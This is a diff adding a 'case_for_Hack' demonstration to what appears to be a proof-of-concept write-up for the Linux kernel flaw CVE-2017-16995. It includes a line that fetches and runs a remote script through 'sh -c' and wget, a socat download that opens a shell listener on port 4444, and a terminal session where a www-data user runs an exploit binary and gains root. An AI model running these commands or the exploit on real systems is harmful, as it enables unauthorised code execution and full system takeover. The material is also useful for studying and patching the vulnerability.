@@ -127,6 +127,28 @@ or you can do that
 sh -c "$(wget http://x.x.x.x/exp.sh -O -)"
 
 ```
+### case_for_Hack
+```
+➜  ~ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat file:`tty`,raw,echo=0 tcp-li
+sten:4444
+
+www-data@vultr:/var/www/html$ su root
+Password: 
+su: Authentication failure
+www-data@vultr:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@vultr:/var/www/html$ /tmp/pwned
+task_struct = ffff880078bf9540
+uidptr = ffff88007c3b16c4
+spawning root shell
+
+root@vultr:/var/www/html# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@vultr:/var/www/html# 
+
+```
+
 ### 参考链接
 
 https://access.redhat.com/security/cve/cve-2017-16995
